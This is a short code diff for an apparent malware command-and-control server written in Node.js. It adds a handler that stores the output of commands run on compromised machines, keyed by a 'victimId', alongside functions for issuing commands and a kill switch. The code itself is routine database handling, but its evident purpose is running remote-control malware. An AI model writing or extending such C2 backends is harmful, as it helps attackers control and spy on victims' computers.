@@ -68,8 +68,37 @@ async function getCmd(req, res) {
 	}
 }
 
-function postResult(req, res) {
+async function postResult(req, res) {
 	const username = req.username;
+
+	const { result, commandId } = req.body;
+
+	if (!username || !result || !commandId) {
+		return res.send({ status: false, message: "Broken request" });
+	} else {
+		const commandResult = new mongodb.CommandResults({
+			commandId: sanitize(commandId),
+			result: sanitize(result),
+			victimId: sanitize(username),
+			resultRecievedOn: new Date(),
+		});
+
+		await commandResult
+			.save()
+			.then(() => {
+				return res.send({
+					status: true,
+					message: "Command result saved successfully",
+				});
+			})
+			.catch((e) => {
+				console.log(e);
+
+				return res
+					.status(500)
+					.send({ status: false, message: "Unknown error" });
+			});
+	}
 }
 
 function killSwitch(req, res) {
